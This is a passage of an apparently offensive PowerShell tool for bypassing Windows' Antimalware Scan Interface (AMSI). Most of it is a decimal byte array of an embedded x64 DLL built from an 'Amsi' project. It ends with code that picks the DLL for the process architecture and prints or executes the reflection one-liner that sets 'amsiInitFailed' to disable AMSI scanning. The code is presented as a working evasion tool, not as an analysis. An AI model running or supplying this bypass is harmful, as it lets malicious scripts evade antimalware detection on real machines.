69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\" if (([IntPtr]::Size) -eq 8) { Write-Verbose \"64 bit process detected.\" $DllBytes = $AmsiX64 } elseif (([IntPtr]::Size) -eq 4) { Write-Verbose \"32 bit process detected.\" $DllBytes = $AmsiX86 } switch($method) { \"unload\" { Write-Verbose \"Using Matt Graeber's Reflection method.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)' } else { Write-Output \"Executing the bypass.\" [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } } 